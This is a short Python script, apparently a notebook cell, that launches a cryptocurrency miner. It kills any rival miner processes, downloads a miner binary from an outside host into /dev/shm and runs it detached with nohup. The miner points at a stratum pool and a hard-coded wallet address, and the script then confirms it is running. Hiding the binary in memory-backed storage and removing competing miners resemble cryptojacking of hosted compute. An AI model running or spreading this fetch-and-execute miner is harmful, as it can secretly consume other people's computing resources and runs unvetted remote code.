import subprocess
import os
import time as t

W = "prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg"
P = "stratum+tcp://sg1.alphapool.tech:5566"
R = "A5000-111"
B = "ada"

subprocess.run(["pkill", "-9", "alpha-miner"], capture_output=True)
subprocess.run(["pkill", "-9", "lpminer"], capture_output=True)
t.sleep(1)

dst = "/dev/shm/alpha-miner"
try:
    subprocess.run(["wget", "-q", "-O", dst, "https://pearl.alphapool.tech/downloads/alpha-miner"], capture_output=True, timeout=60)
except:
    pass

if os.path.exists(dst) and os.path.getsize(dst) > 1000000:
    os.chmod(dst, 0o755)
    cmd = f"nohup {dst} --pool {P} --address {W} --worker {R} --force-backend {B} > /dev/shm/alpha.log 2>&1 &"
    subprocess.run(["bash", "-c", cmd])
    t.sleep(4)
    p = subprocess.run(["pgrep", "-a", "alpha-miner"], capture_output=True, text=True)
    result = "RUNNING" if p.stdout.strip() else "FAILED"
else:
    result = "NO_BIN"
result
